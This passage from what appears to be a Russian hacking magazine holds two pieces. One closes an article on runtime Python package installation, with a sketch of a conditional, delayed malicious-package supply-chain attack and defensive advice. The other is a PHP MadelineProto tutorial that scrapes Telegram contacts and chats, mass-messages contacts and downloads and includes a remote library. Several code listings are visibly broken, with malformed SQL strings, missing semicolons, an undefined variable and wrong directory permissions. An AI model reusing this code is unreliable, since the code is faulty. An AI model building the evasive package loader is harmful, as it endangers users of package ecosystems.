  Using cached six-1.16.0-py2.py3-none-any.whl.metadata (1.8 kB)
  Downloading pandas-2.2.3-cp311-cp311-macosx_11_0_arm64.whl (11.3 MB)
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 11.3/11.3 MB 153.5 kB/s eta 0:
  00:00
  Using cached numpy-2.1.1-cp311-cp311-macosx_14_0_arm64.whl (5.4 MB)
  Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl (229 kB)
  Downloading pytz-2024.2-py2.py3-none-any.whl (508 kB)
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 508.0/508.0 kB 80.8 kB/s eta 0:
  00:00
  Downloading tzdata-2024.2-py2.py3-none-any.whl (346 kB)
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 346.6/346.6 kB 178.2 kB/s eta
  0:00:00
  Using cached six-1.16.0-py2.py3-none-any.whl (11 kB)
  Installing collected packages: pytz, tzdata, six, numpy, python-
  dateutil, pandas
  Successfully installed numpy-2.1.1 pandas-2.2.3 python-dateutil-2.9.0.
  post0 pytz-2024.2 six-1.16.0 tzdata-2024.2


  [notice] A new release of pip is available: 24.0 -> 24.2
  [notice] To update, run: python3.11 -m pip install --upgrade pip
  >>> pd.DataFrame({'lol': [1, 2, 3], 'kek': [4, 5, 6]})
  lol  kek
  0    1    4
  1    2    5
  2    3    6
  >>> pd.__version__
  '2.2.3'
  >>>


Как видишь, pandas скачался и импортировался прямо на лету. Он подключен
и работает.
   Теперь попробуем запустить небольшой скрипт через instld. Создадим
файл script.py, который будет что‑нибудь делать. Для простоты снова
используем пример с pandas:


import pandas as pd


print(pd.DataFrame({'lol': [1, 2, 3], 'kek': [4, 5, 6]}))

Запускаем:



  $ instld script.py
  ...
  lol  kek
  0    1    4
  1    2    5
  2    3    6


И снова работает.
  Под конец еще немного магии:


pip list | grep pandas

Пусто! То есть мы импортировали pandas прямо из сети, поиграли с ним,
а когда закончили, никакого мусора не осталось. Безотходное производство!


КОЕ-ЧТО ПОТЯЖЕЛЕЕ

Фокусы, которые я показал, любопытны и могут быть полезны в определенных
условиях, но у нас тут журнал «Хакер», а не клуб любителей потеребить
питона. Давай сделаем кое‑что хакерское. Что‑то, что сделает уязвимой всю
экосистему пакетов Python...
   Создадим новый файл вот с таким содержимым:


import instld


with instld('pandas', catch_output=True):
    import pandas as pd
    print(f'The version of pandas is: {pd.__version__}')

Запустим его через обычную команду python (или python3, если ты хранишь
второй Python в качестве сувенира), все работает:


$ python3 script.py
The version of pandas is: 2.2.3

А еще можно вот так:


import instld


with instld('flask==3.0.0', catch_output=True) as context:
    flask_1 = context.import_here('flask')
    print(f'The version of the first flask: {flask_1.__version__}')
# 3.0.0


with instld('flask==3.0.3', catch_output=True) as context:
    flask_2 = context.import_here('flask')
    print(f'The version of the second flask: {flask_2.__version__}')
# 3.0.3

Запускаем, смотрим:


$ python3 script.py
The version of the first flask: 3.0.0
The version of the second flask: 3.0.3

Давай осмыслим, что сейчас произошло. Мы написали скрипт и запустили
его через обычный Python, никаких специальных команд. Прямо внутри скрип‐
та мы подключили сторонний пакет, который прямо на месте  скачался
из сети, был использован и затем автоматически удален, когда поток выпол‐
нения вышел из контекста. Никаких следов. Более того, мы смогли установить
в одном рантайме две разные версии одного и того же пакета. Мы можем
делать с пакетами невозможное!
  В наших примерах строчки с именами пакетов, которые были установлены
внутри контекста, существовали в виде литералов, то есть заранее известно,
где какой будет пакет и какая у него будет версия. Статический анализатор
найдет все импорты без проблем.
  Но можно сделать и иначе: название пакета может скачиваться по сети
либо генерироваться хитрым алгоритмом на  месте, создавая условное
поведение. Когда нужно — скачивается пакет с безобидным содержимым,
все работает, как того ожидает пользователь; а в какой‑то другой ситуации
скачивается другой пакет, содержащий вредоносный код. Пример:


import instld


def is_user_a_bad_boy():
    ...


if is_user_a_bad_boy():
    package_name = 'bad_package'
else:
    package_name = 'good_package'


with instld(package_name, catch_output=True) as context:
    some_module = context.import_here('some_module')

Особенности таких зловредов:
 • Пакет может не содержать внутри себя опасного кода непосредственно.
   Опасный код скачается из сети, когда он будет нужен.
 • Обычный сканер исходного кода может такие проблемы не заметить, пос‐
   кольку код не вредоносен сам по себе.
 • Анализ  графа  зависимостей  библиотек  бесполезен,  так  как  список
   зависимостей, объявленных пакетом явно, неполон. А динамический граф
   зависимостей может быть слишком сложен для анализа.
 • Возможны очень таргетированные атаки. Код основного пакета может
   подтягивать безопасные зависимости для 99% пользователей, но, когда
   окажется на целевых устройствах, посигналит серверу, что на этот раз
   нужно отдать другой код.
 • Возможны «спящие» уязвимости. Во многих крупных компаниях есть собс‐
   твенные «отстойники» для внешних пакетов. Обычно после выхода новой
   версии любого пакета тот дожидается, пока где‑то успеют появиться
   сообщения об  уязвимостях. Если сообщений  нет,  сотрудники могут
   переходить на новую версию. Однако с такой технологией возможен
   обход карантинов: можно легко сделать уязвимость, которая «проснется»
   через месяц или более и начнет скачивать из сети опасный код вместо
   безопасного.

Короче, это вполне может стать проблемой.


ПРОХОДИМ РЕАБИЛИТАЦИЮ

Как защитить свою организацию или личные проекты от подобных опас‐
ностей? Первое, что приходит в голову: а давайте запретим instld! Легко пос‐
мотреть в список зависимостей пакета, и, если там обнаружится instld, просто
не дадим его установить! Однако это, к сожалению, плохой путь. Но instld —
это всего лишь моя реализация, никто не мешает клонировать код и назвать
как‑то иначе.
  Да и магия‑то относительная: код внутри довольно простой и опирается
на стандартную библиотеку. Ничего такого, чего злоумышленник не мог бы
позаимствовать, видоизменить или даже придумать с нуля.
   Вот что делает библиотека (вкратце):
 • В контексте создается временная директория для установки пакетов.
 • В эту директорию устанавливается пакет. Через обычный pip, который
   вызывается через subprocess.
 • Директория, куда был установлен пакет, временно (на время действия
    контекста) добавляется в sys.path — глобальную переменную со списком
   всех директорий, где происходит поиск пакета при каждом импорте. Когда
   ты пишешь в своем скрипте import something, интерпретатор про‐
   ходится по всем директориям из этого списка, пока не найдет там пакет
   под названием something.

Как видишь, сам по себе механизм нехитрый и банить конкретно instld —
это не защита. Я бы порекомендовал следующие меры:
 • Банить любой пакет за любые манипуляции с sys.path. К сожалению,
   этот способ может прикрыть и кучу вполне безобидных библиотек. Самые
   нужные из них можно внести в белый список, а остальные — тупо банить.
 • Не давать программе взаимодействовать с диском, запускать ее в контей‐
   нере с рид‑онли файловой системой. В этом случае INSTLD обломил‐
   ся бы еще на этапе попытки скачать пакет. Однако полной защитой это не
   является, поскольку видится не совсем уж невозможным провести все
   манипуляции со скачиванием и установкой пакета прямо в оперативной
   памяти.

Если есть другие идеи — пиши в комментариях!


ВЫВОДЫ

Мы выяснили, как делать разные фокусы с установкой питонячьих пакетов.
Оказывается, можно устанавливать их прямо в рантайме — по требованию.
Это выручит, если твое окружение Python и проект настолько безумны, что
требуется несколько разных версий одного пакета в одном приложении.
   Но, как и почти все прикольное в этом мире, это открывает новые опас‐
ности, против которых могут не сработать старые защиты. Надеюсь, тебя кос‐
нется только прикольная сторона дела!
КОДИНГ





Библиотека MadelineProto позволяет с лег‐
костью  написать  собственный  Telegram-
клиент,  который   можно   использовать
по‑разному — от отправки сообщения все‐
му контакт‑листу до взлома Telegram-акка‐         Евгений Андреев                                                                                    ea9574524@gmail.com
унтов. При этом библиотека не использует
Bot  API, что  значительно упрощает раз‐
работку. В  этой  статье мы  разберем
базовые  функции  клиента:  авторизацию,
получение  списка  контактов,  извлечение
информации о пользователях и отправку им
сообщений.


ПОДГОТОВИТЕЛЬНЫЕ МЕРОПРИЯТИЯ

Саму библиотеку MadelineProto устанавливать и обновлять не нужно. Скрипты
устроены таким образом, что, если файл библиотеки отсутствует, он будет
загружен автоматически. Однако тебе нужно позаботиться о двух вещах:
 • Библиотека требует PHP 8.2+, поэтому, если у тебя его нет, придется
   где‑то раздобыть. Как правило, в последних версиях Ubuntu именно эта
   версия — скачай и разверни образ последней Ubuntu в виртуальной
   машине. Если Linux — твоя основная система и переустанавливать тебе ее
   совсем не хочется, я расскажу, как обновиться.
 • Тебе нужно создать свое приложение Telegram. Для этого зарегистрируй‐
   ся на my.telegram.org , перейди в раздел API development tools и запол‐
   ни форму. Далее ты получишь api_id и api_hash — сохрани эти зна‐
   чения, они тебе пригодятся.

С  регистрацией приложения разберешься сам, там все  просто, а вот
для обновления PHP до нужной версии тебе надо подключить репозиторий
Ondřej Surý PPA. Введи следующие команды:


sudo apt install software-properties-common -y && sudo add-apt-
repository ppa:ondrej/php -y
sudo apt update && sudo apt upgrade

После этого введи команду установки PHP 8.2:


sudo apt install php8.2

Если у тебя развернут Apache, то установи еще один пакет и перезапусти
веб‑сервер:


sudo apt install libapache2-mod-php8.2
sudo systemctl restart apache2

Затем введи команду php -v. Ты должен увидеть примерно такой вывод:



  PHP 8.2.0 (cli) (built: Dec 10 2022 10:52:42) (NTS)
  Copyright (c) The PHP Group
  Zend Engine v4.2.0, Copyright (c) Zend Technologies
      with Zend OPcache v8.2.0, Copyright (c), by Zend Technologies


Как видишь, ничего сложного.


АВТОРИЗАЦИЯ

Напишем простейший сценарий, выполняющий авторизацию пользователя.
Для этого нам понадобится Telegram-аккаунт. Можешь тренироваться на сво‐
ем аккаунте: не беспокойся, ты всегда сможешь поменять пароль, и биб‐
лиотека точно не угонит твою учетку.


<?php


$userDir = '';
$api_id = 11111;            // Добавь сюда api_id
$api_hash = 'xxxxxxx';      // Добавь сюда api_hash
$phone = 'твой номер телефона'; // Номер телефона


if (!file_exists($userDir . '/madeline.php')) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.
php');
}
include_once $userDir . '/madeline.php';


$settings = (new \danog\MadelineProto\Settings\AppInfo)
    ->setApiId($api_id)
    ->setApiHash($api_hash);


use danog\MadelineProto\Tools;


$MadelineProto = new \danog\MadelineProto\API($userDir . "/session",
$settings);


$MadelineProto->phoneLogin($phone);


$authorization = $MadelineProto->completePhoneLogin(Tools::readLine(
'Enter the phone code: '));


if ($authorization['_'] === 'account.needSignup') {
    echo "needSignup for $phone";
    die();
}



if ($authorization['_'] === 'account.password') {
    $authorization = $MadelineProto->complete2falogin(Tools::readLine
('Please enter your password (hint '.$authorization['hint'].'): '));
}

Теперь разберемся, что мы делаем. Для начала мы задаем необходимые
переменные: $api_id, $api_hash, $userDir. С первыми двумя все ясно,
а $userDir ты можешь использовать, если нужно, чтобы madeline.php заг‐
ружался в какой‑то другой, а не текущий каталог. Если эта переменная содер‐
жит пустое значение, madeline.php будет загружаться в текущий каталог
и оттуда инклудиться.
   Далее мы создаем объект с параметрами. В старых версиях MadelineProto
для указания параметров приложений использовался ассоциативный массив,
поэтому в интернете ты сможешь найти устаревшие скрипты с использовани‐
ем этой библиотеки, которые работать не будут как раз по этой самой при‐
чине — вместо массива теперь используется объект с параметрами.
   Этот объект нужно передать конструктору \danog\MadelineProto\API().
Первый его параметр — название каталога с сессией входящего в учетку
пользователя, а второй — это как раз объект с параметрами. Обрати вни‐
мание: мы  также используем $userDir,  чтобы каталог с  сессией мог
находиться в другой папке, если тебе так будет удобнее. Когда ты пишешь
Telegram-клиент для одного пользователя, то никаких проблем не возникает.
Но если ты планируешь использовать клиент для входа многих пользовате‐
лей, для поддержания порядка нужно будет держать сессии в разных катало‐
гах — для каждого пользователя  придется создавать отдельную  папку.
Думаю, это понятно.
   Метод phoneLogin() применяется для входа с использованием номера
телефона. Укажи номер телефона в том формате, в котором ты указываешь
его при входе в Telegram, но без +.
   После этого на твой телефон будет отправлено сообщение с 2FA-кодом.
Как правило, оно отправляется уже не по SMS, а в твой Telegram, поэтому
открой приложение на телефоне и перейди к чату с названием Telegram.
   Если мессенджер на твоем телефоне не установлен, скрипт сообщит
об этом и умрет — сработает вызов die().
   Если для твоего аккаунта установлен пароль, скрипт запросит его. Разуме‐
ется, если пароль правильный, то все хорошо, а вот если нет, ты получишь
соответствующее сообщение от самой библиотеки. Отдельно обрабатывать
исключение неправильно введенного пароля не стану — ты при желании
справишься сам.
   После входа в аккаунт ты сможешь выполнять всевозможные действия,
например запрашивать список контактов, отправлять им сообщения, читать
диалоги (чаты), удалять сообщения и диалоги. Библиотека MadelineProto поз‐
воляет в этом плане выполнять много различных действий. Для начала поп‐
робуем получить список контактов.


ПОЛУЧАЕМ СПИСОК КОНТАКТОВ

Метод getContacts() получает список контактов из твоего Telegram-акка‐
унта. Рассмотрим фрагмент кода, выводящий контакты на экран:


$contacts = $MadelineProto->contacts->getContacts();
$users = $contacts['users'];


foreach ($users as $user) {


    $firstname = $user['first_name'] ?? '';
    $lastname = $user['last_name'] ?? '';
    $username = $user['username'] ?? '';
    $uphone = $user['phone'] ?? '';


    echo "$user[id]\t$firstname\t$lastname\t$username\t$uphone\n";
}

Что делать с контактами дальше? Да что угодно. Например, можно сохранить
все эти контакты в таблице базы данных, чтобы они никуда не потерялись.
А еще можно отправить каждому контакту сообщение.


СОХРАНЯЕМ КОНТАКТЫ В БАЗУ ДАННЫХ

Не будем изобретать велосипед и установим MySQL для работы с базой дан‐
ных:


sudo apt install mysql-server mysql-client

Открой клиент MySQL, например так:


mysql -u root

Если ты уже успел задать пароль для пользователя root, добавь к предыду‐
щей команде параметр -p, чтобы программа запросила пароль пользовате‐
ля.
  Мы не будем создавать новую базу данных, а станем использовать уже
имеющуюся с именем test:


use test;

Создай таблицу contacts:


CREATE TABLE `contacts` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  ` uid` varchar( 50) NOT NULL,
  ` fname` varchar( 200) DEFAULT NULL,
  ` lname` varchar( 200) DEFAULT NULL,
  `username` varchar( 200) DEFAULT NULL,
  ` tid` varchar( 250) DEFAULT NULL,
  ` phone` varchar( 50) DEFAULT NULL,
  PRIMARY KEY(id)
);

Назначение полей:
 • id — просто счетчик контакта, он же первичный ключ, чтобы было удобнее
   работать с таблицей;
 • uid — номер  пользователя, которому принадлежит текущая  учетная
   запись (чтобы контакты от разных пользователей не перемешивались);
 • fname — имя контакта (first_name);
 • lname — фамилия контакта (last_name);
 • username — имя пользователя контакта;
 • tid — Telegram ID контакта;
 • phone — телефон контакта (если доступен для считывания).

Теперь нужно выйти из MySQL и продолжить кодинг:


exit

Вернемся к нашему фрагменту вывода контактов. Расширим его, добавив код
вставки контактов в таблицу contacts:


$contacts = $MadelineProto->contacts->getContacts();
$users = $contacts['users'];


foreach ($users as $user) {


    $firstname = $user['first_name'] ?? '';
    $lastname = $user['last_name'] ?? '';
    $username = $user['username'] ?? '';
    $uphone = $user['phone'] ?? '';


    // Настоятельно рекомендуется перед добавлением в БД:
    $firstname = $mysqli->real_escape_string($firstname);
    $lastname = $mysqli->real_escape_string($lastname);
    $username = $mysqli->real_escape_string($username);
    $uphone = $mysqli->real_escape_string($uphone);



     echo "$user[id]\t$firstname\t$lastname\t$username\t$uphone\n";


     // Проверяем, есть ли контакт в списке
     $sql = "select * from contacts where uid = "$phone" and tid =
$user[id]";
     $result = $mysqli->query($sql) or die($mysqli->error);
     if ($result->num_rows == 0) {
      // Создаем новый контакт
      $sql = "insert into contacts values(0, "$phone", "$firstname",
"$lastname", "$username", "$user[id]", "$uphone")";
      $mysqli->query($sql) or die($mysqli->error);
   }


}

Разумеется, где‑то в скрипте до этого цикла ты должен подключиться к БД,
но я все‑таки рассчитываю, что минимальные навыки программирования
на PHP у тебя есть:


$mysqli = new mysqli($dbhost,$dbuser,$dbpass,$db);


if ($mysqli->connect_errno) {
    die($mysqli->connect_error);
}

Когда ты взглянешь на этот код, станет понятно, зачем мы сохраняли Telegram
ID в списке контактов, — по нему мы проверяем, добавлен такой контакт
для текущего пользователя или нет. А поле uid мы добавили с одной
целью — чтобы наша табличка могла хранить контакты разных аккаунтов:
не создавать же для этого отдельные таблицы (хотя при необходимости тоже
можно).
   Так вот, если для текущего пользователя контакт с заданным Telegram ID
не существует в таблице contacts, мы выполняем SQL-оператор insert
для вставки контакта в таблицу.


ОТПРАВЛЯЕМ СООБЩЕНИЯ ПОЛЬЗОВАТЕЛЯМ ИЗ КОНТАКТ-
СПИСКА

Первым делом хочу предостеречь: чтобы твой аккаунт не заблокировали
за спам, лучше не устраивать массовую рассылку всем сразу. Для отправки
сообщения используется метод sendMessage, которому нужно передать два
параметра — ID пользователя Telegram, которому отправляется сообщение
(обрати внимание: не номер телефона), а также само сообщение:


    $MadelineProto->messages->sendMessage([
        'peer' => $user['id'],
        'message' => "$firstname, с Новым годом!"
        ]);

Если контактов в твоем списке не очень много, можешь запускать этот код
без проблем. А вот если контактов хотя бы несколько десятков, придумай,
как изменить алгоритм, чтобы он отправлял сообщения не всем  сразу,
а поочередно — при первом запуске первым десяти контактам, при втором —
следующим десяти и так далее. Делай перерывы между запусками клиента.
В общем, все индивидуально: иногда ты можешь отправить тысячу сооб‐
щений и тебя не заблокируют за спам, а можешь отправлять с перерывами,
осторожничать — и твою учетку заблокируют на пятисотом сообщении.


СОБИРАЕМ ВСЕ ВМЕСТЕ

А вот полный код клиента, получающего список контактов и сохраняющего
его в таблицу contacts:


<?php


$userDir = '';
$api_id = 11111;            // Добавь сюда api_id
$api_hash = 'xxxxxxx';      // Добавь сюда api_hash
$phone = 'твой номер телефона'; // Номер телефона


$dbhost = 'localhost';
$dbuser = 'root';
$dbpass = '';
$db = 'test';


// Подключаемся к БД
$mysqli = new mysqli($dbhost, $dbuser, $dbpass, $db);


if ($mysqli->connect_errno) {
    die($mysqli->connect_error);
}


// Загружаем библиотеку
if (!file_exists($userDir . '/madeline.php')) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.
php');
}
include_once $userDir . '/madeline.php';


// Формируем объект с параметрами
$settings = (new \danog\MadelineProto\Settings\AppInfo)
    ->setApiId($api_id)
    ->setApiHash($api_hash);


use danog\MadelineProto\Tools;


$MadelineProto = new \danog\MadelineProto\API($userDir . "/session",
$settings);


// Вход под именем пользователя
$MadelineProto->phoneLogin($phone);


$authorization = $MadelineProto->completePhoneLogin(Tools::readLine(
'Enter the phone code: '));


if ($authorization['_'] === 'account.needSignup') {
    echo "needSignup for $phone";
    die();
}



if ($authorization['_'] === 'account.password') {
    $authorization = $MadelineProto->complete2falogin(Tools::readLine
('Please enter your password (hint '.$authorization['hint'].'): '));
}


// Получаем список контактов
$contacts = $MadelineProto->contacts->getContacts();
$users = $contacts['users'];


foreach ($users as $user) {


  $firstname = $user['first_name'] ?? '';
  $lastname = $user['last_name'] ?? '';
  $username = $user['username'] ?? '';
  $uphone = $user['phone'] ?? '';


  // Настоятельно рекомендуется перед добавлением в БД:
  $firstname = $mysqli->real_escape_string($firstname);
  $lastname = $mysqli->real_escape_string($lastname);
  $username = $mysqli->real_escape_string($username);
  $uphone = $mysqli->real_escape_string($uphone);


   echo "$user[id]\t$firstname\t$lastname\t$username\t$uphone\n";


   // Проверяем, есть ли контакт в списке
   $sql = "select * from contacts where uid = "$phone" and tid =
$user[id]";
   $result = $mysqli->query($sql) or die($mysqli->error);
   if ($result->num_rows == 0) {
      // Создаем новый контакт
      $sql = "insert into contacts values(0, "$phone", "$firstname",
"$lastname", "$username", "$user[id]", "$uphone")";
      $mysqli->query($sql) or die($mysqli->error);
   }


}

Итак, наш скрипт вполне работоспособен, но возможностей у него пока
еще не слишком много. В следующий раз мы продолжим изучение библиоте‐
ки и рассмотрим, как можно получить и сохранить в базу данных диалоги
(чаты) из Telegram.
   Теперь давай разберемся, как извлечь список диалогов и получить из них
отдельные сообщения.


МЕТОД GETDIALOGS()

После того как ты залогинился, можно получить из Telegram список диалогов.
Сделать это легко — достаточно вызвать метод getDialogs():


$dialogs = $MadelineProto->messages->getDialogs();

Теперь в цикле for можно пройтись по этим диалогам, чтобы вытащить отту‐
да что‑нибудь ценное:


$n = count($dialogs);
for ($i = 0; $i < $n; $i++)
{
    // Обрабатываем диалоги
}

Но не все так просто, как кажется, иначе не нужно было бы писать целую
статью. Я не знаю, что ты будешь делать с вытащенными из «Телеграма»
диалогами, но представим, что тебе нужно вывести их на экран (ты же
можешь сохранить их в файл или в БД — как тебе захочется).


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
 ПЫШКИ И TELEGRAM
      ПИШЕМ КЛИЕНТ TELEGRAM НА PHP





ПОЛЬЗОВАТЕЛЬСКИЕ ДИАЛОГИ И ЧАТЫ

Диалоги бывают двух видов: пользовательские и чаты. К первому типу отно‐
сятся диалоги с пользователями, ботами, самим Telegram (когда система
отправляет тебе сообщения, например о попытке входа), а также каналы
представлены в формате пользовательских диалогов. В общем, если потен‐
циальных участников беседы не больше двух (ты и еще кто‑то), то это поль‐
зовательский диалог. А вот чат — это когда отправителей сообщений нес‐
колько, причем в эту категорию входят и диалоги приватных групп. Это когда
ты создаешь группу мамочек 3Б класса и добавляешь туда всех желающих.
Затем каждая из мамочек в семь часов утра начинает отправлять в эту группу
сообщение о том, что ее чадо заболело или будет отсутствовать по семей‐
ным обстоятельствам. Знакомо?
   Короче, структура чатов отличается от структуры пользовательских диало‐
гов, и, чтобы не запутаться, мы напишем отдельные функции для обработки
диалогов разных типов.
  Я буду использовать процедурный стиль программирования: если хочешь
использовать ООП — пожалуйста, но лично я не вижу смысла городить клас‐
сы для решения столь простой задачи.
   Первым делом в нашем цикле for нам нужно получить информацию
о собеседнике, что можно сделать методом getInfo():


$userinfo = $MadelineProto->getInfo($dialogs["dialogs"][$i]);

Если в массиве $userInfo установлен элемент User, это пользовательский
диалог, а если там есть элемент Chat — диалог приватной группы. Пример
обработки:


if (isset($userinfo['User'])) {
    // Обрабатываем пользовательский диалог
    $peerId = $userinfo['user_id'];
    $username = $userinfo['User']['username'] ?? 'n/a';


    if (isset($userinfo['User']['first_name']))
        $fullname = $userinfo['User']['first_name'];
    else $fullname = '';
    if(isset($userinfo['User']['last_name'])){
        $fullname .= ' '. $userinfo['User']['last_name'];
    }
    }
    echo("Full Name: $fullname UserId: $peerId Username @: $username\
n");
//  getRegularMessages($library, $peerId, $fullname, $username);
}
if (isset($userinfo['Chat'])) {
    // Обрабатываем диалог группы
    $peerId = $peers["dialogs"][$i]["peer"];
    $chatname = "Группа " . $userinfo['Chat']['title'];
    echo("PeerId: $peerId $chatname\n");
//  getGroupMessages($library, $peerId, $chatname);
}

Обрати внимание на одну особенность  библиотеки. Если пользователь
не заполнил о себе какую‑то информацию, например написал в профиле
только свое имя, но не фамилию, то соответствующий элемент — в данном
случае last_name — будет попросту отсутствовать в массиве userinfo. А что
произойдет, если PHP попытается обратиться к несуществующему элементу?
Правильно, ты получишь ошибку и не сможешь прочитать весь список диало‐
гов, поскольку выполнение скрипта будет прервано раньше. Поэтому обя‐
зательно проверяй с помощью isset() элементы, которые ты пытаешься
получить из $userinfo и  других  структур,  возвращаемых  библиотекой
MadelineProto.
   Код, который ты поместишь в наш цикл for, будет выводить список диало‐
гов. Просто список диалогов, но не список сообщений для каждого из них.
Название диалога будет предваряться строкой "Группа ", если выводится
диалог для группы.
   Также обрати внимание, что у нас закомментированы вызовы функций
getRegularMessages() и getGroupMessages(). Пока эти функции не готовы,
и я закомментировал их вызов, чтобы ты смог запустить код и увидеть список
чатов.


ВЫВОДИМ СООБЩЕНИЯ ИЗ ПОЛЬЗОВАТЕЛЬСКОГО ДИАЛОГА

В эту функцию мы передаем переменную‑объект MadelineProto, а также
информацию о пользователе, полученную ранее: она пригодится, если ты
надумаешь не просто выводить сообщения на экран, а сохранять их в БД
или файл.
   Получить список сообщений в том или ином диалоге можно с помощью
вызова getHistory():


$messages = $library->messages->getHistory(peer:$peerId,limit:10);

Первый параметр — это $peerId, то есть ID пользователя, с которым у тебя
ведется диалог. Для чатов — это содержимое элемента массива peer. Вто‐
рой параметр — количество последних сообщений из диалога. В нашем слу‐
чае мы получаем десять последних сообщений.
   Сами сообщения будут храниться в элементе messages:


$msgs = $messages['messages'];
foreach ($msgs as $item) {
// На всякий случай проверяем, есть ли элемент message внутри
// Это нормальная практика при работе с MadelineProto
    if (isset($item['message'])) {
    // Обработка каждого отдельного сообщения $item['message']
    }
}

Нам пригодятся следующие элементы массива $item:
 • message — сам текст сообщения. Если будешь помещать его в БД, обя‐
   зательно пропусти через функцию $mysqli->real_escape_string() ,
   иначе ничего не получится;
 • date — дата и время отправки сообщения;
 • out — если значение этого элемента false, то мы имеем дело с вхо‐
  дящим сообщением (которое написали тебе), а если true — то это исхо‐
  дящее сообщение (написал ты);
 • media — позволяет работать не только с текстовыми сообщениями, но и
   с фотографиями, документами, файлами и прочим контентом.

Выведем текст сообщения, дату и признак out:


$msgs = $messages['messages'];
foreach ($msgs as $item) {
// На всякий случай проверяем, есть ли элемент message внутри
// Это нормальная практика при работе с MadelineProto
    if (isset($item['message'])) {
    echo "==========================\n";
    echo "Диалог с $fullname @ $username\n"
    echo "Дата: " . date('m/d/Y H:i', $item['date']);
    if ($item['out'] === false) echo "Входящее сообщение:\n";
    else echo "Исходящее сообщение:\n";
echo $item["message"] . "\n";
    echo "==========================\n";


    }
}

Теперь разберемся с элементом $item["media"]["_"]. Он содержит тип
присоединенного    медиафайла.   Нас    интересуют   два   типа  —
messageMediaDocument и messageMediaPhoto. С остальными ты сможешь
ознакомиться самостоятельно в документации: эти типы позволяют, нап‐
ример, сохранять всякие стикеры.
   Первый из интересующих нас типов — это какой‑то медиафайл. Сюда
относятся все типы файлов, которые ты можешь пересылать через Telegram:
видео, архивы, PDF и так далее. Второй тип выделен исключительно для кар‐
тинок (фотографий).
   Скачать   медиафайл   можно   с  помощью   метода   $library->
downloadToDir().  Первый  параметр —  это  все  сообщение  целиком
(переменная $item), а второй — каталог, в который нужно скачать данный
файл. Используя тип документа, мы можем сохранять картинки в один
каталог, а остальные файлы — в другой. Метод getDownloadInfo() позволя‐
ет узнать имя файла и его расширение: при желании ты можешь распихать
файлы по разным папкам в зависимости от расширения.
   Вот пример кода загрузки файла:


if (isset($item["media"]["_"])) {
    $mediaType = $item["media"]["_"];
    switch ($mediaType) {
      case "messageMediaDocument":
        // Получаем инфо о файле. Потом можешь использовать по
своему усмотрению
        $info = $library->getDownloadInfo($item);
        // name — имя, ext — расширение
        $fileName = $info['name'] . $info['ext'];
        $outFileName = $library->downloadToDir($item, "files");
        break;
    case "messageMediaPhoto":
        $info = $MadelineProto->getDownloadInfo($item);
        $fileName = $info['name'] . $info['ext'];
        $outFileName = $library->downloadToDir($item, "pics");
        break;
    }
}


             INFO

                    При сохранении файлов неплохо бы проверять
                          доступное дисковое пространство. Если ты вдруг
                      передал   другу  фильм  объемом   несколько
                         гигабайт, то он загрузится в папку files в пол‐
                     ном составе. А если таких фильмов будет много,
                      ты рискуешь заполнить все доступное пространс‐
                           тво.


Метод  downloadToDir()   возвращает   результирующее  имя   файла.
Как видишь, мы все файлы помещаем в папку files (которая должна сущес‐
твовать в рабочем каталоге и иметь соответствующим образом установ‐
ленные права доступа), а картинки — в отдельный каталог pics. Чтобы наш
код работал, не забудь создать эти каталоги:


mkdir files
chmod 666 files
mkdir pics
chmod 666 pics

Полный код функции getRegularMessages() приведен ниже:


Вывод обычного сообщения getRegularMessages()
function getRegularMessages($library, $peerId, $fullname, $username)
{


  $messages = $library->messages->getHistory(peer:$peerId,limit:10);
  $msgs = $messages['messages'];
  foreach ($msgs as $item) {
    // На всякий случай проверяем, есть ли элемент message внутри
    // Это нормальная практика при работе с MadelineProto
    if (isset($item['message'])) {
    echo "==========================\n";
    echo "Диалог с $fullname @ $username\n"
    echo "Дата: " . date('m/d/Y H:i', $item['date']);
    if ($item['out'] === false) echo "Входящее сообщение:\n";
    else echo "Исходящее сообщение:\n";
echo $item["message"] . "\n";
    echo "==========================\n";


    }
  }
}

Код  обработки  медиафайлов ты можешь добавить  в  цикл foreach()
по желанию.


ВЫВОДИМ СООБЩЕНИЯ ИЗ ЧАТА

Эта функция очень похожа на getRegularMessages(), но есть важные отли‐
чия. Во‑первых, нам нужно получить список всех участников чата:


$users = $chatInfo['users'];

ID пользователя, написавшего сообщение в группу, хранится в элементе мас‐
сива сообщения $item["peer_id"]. Но, как понимаешь, ID пользователя нам
малоинтересен, тебе захочется знать его имя, фамилию или номер телефона
(если эти данные открыты и указаны). Для этого можно написать вот такой
код, определяющий всю перечисленную информацию:


    $userId = $item["peer_id"];
    foreach ($users as $user) {
       if ($user['id'] == $userId) {
         if (isset($user["first_name"]))
 $userInfo .= $user["first_name"] . " ";
         if (isset($user["last_name"]))
 $userInfo .= $user["last_name"] . " ";
         if (isset($user["phone"])) $userInfo .= $user["phone"] . " "
;
         if (isset($user["username"])) $userInfo .= $user["username"]
;
       }
     }

Мы добавляем все сведения о пользователе в переменную $userInfo
для компактности.


Код функции getGroupMessages()
function getGroupMessages($library, $chat_id, $chatname) {


  $messages = $library->messages->getHistory(peer:$chat_id,limit:10);
  $msgs = $messages['messages'];
  foreach ($msgs as $item) {
    // На всякий случай проверяем, есть ли элемент message внутри
    // Это нормальная практика при работе с MadelineProto
    if (isset($item['message'])) {


    $userId = $item["peer_id"]; $userInfo = "";
    foreach ($users as $user) {
       if ($user['id'] == $userId) {
         if (isset($user["first_name"]))
 $userInfo .= $user["first_name"] . " ";
         if (isset($user["last_name"]))
 $userInfo .= $user["last_name"] . " ";
         if (isset($user["phone"])) $userInfo .= $user["phone"] . " "
;
         if (isset($user["username"])) $userInfo .= $user["username"]
;
       }
     }


    echo "==========================\n";
    echo "Чат $chatname\n"
    echo "Дата: " . date('m/d/Y H:i', $item['date']);
    echo "Пользователь: $userInfo\n"
    if ($item['out'] === false) echo "Входящее сообщение:\n";
    else echo "Исходящее сообщение:\n";
echo $item["message"] . "\n";
    echo "==========================\n";


    }
  }
}

Медиавложения обрабатываются аналогичным образом.


ВЫВОДЫ

Как видишь, получить список пользователей, вытащить из Telegram все дан‐
